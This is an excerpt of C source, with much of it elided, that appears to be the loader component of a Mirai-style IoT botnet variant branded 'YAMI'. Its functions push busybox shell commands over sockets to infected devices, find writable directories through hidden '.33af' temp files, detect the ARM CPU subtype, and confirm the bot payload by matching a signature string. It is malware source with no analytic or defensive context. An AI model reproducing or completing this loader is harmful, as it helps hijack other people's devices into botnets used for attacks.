...
int connection_consume_mounts(struct connection *conn)
{
    ...
    for (i = 0; i < prompt_ending; i++)
    {
        ...
        if (conn->rdbuf[i] == '\n')
        {
            ...
            {
                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.33af; /bin/busybox cat %s/.33af; /bin/busybox rm %s/.33af\r\n",
    ...
    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.33af; /bin/busybox cat /dev/.33af; /bin/busybox rm /dev/.33af\r\n",
                                VERIFY_STRING_HEX);
...
int connection_consume_written_dirs(struct connection *conn)
{
    ...
    while (TRUE)
    {
        ...
        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.33af\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
...
int connection_consume_arm_subtype(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1) 
	{
#ifdef DEBUG
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if (util_memsearch(conn->rdbuf, offset, "{YAMI}- You Can Find Me At yami.crimson.rip -{daddyl33t}", 56) == -1)
        return offset;
    else
        return 255 + offset;
}
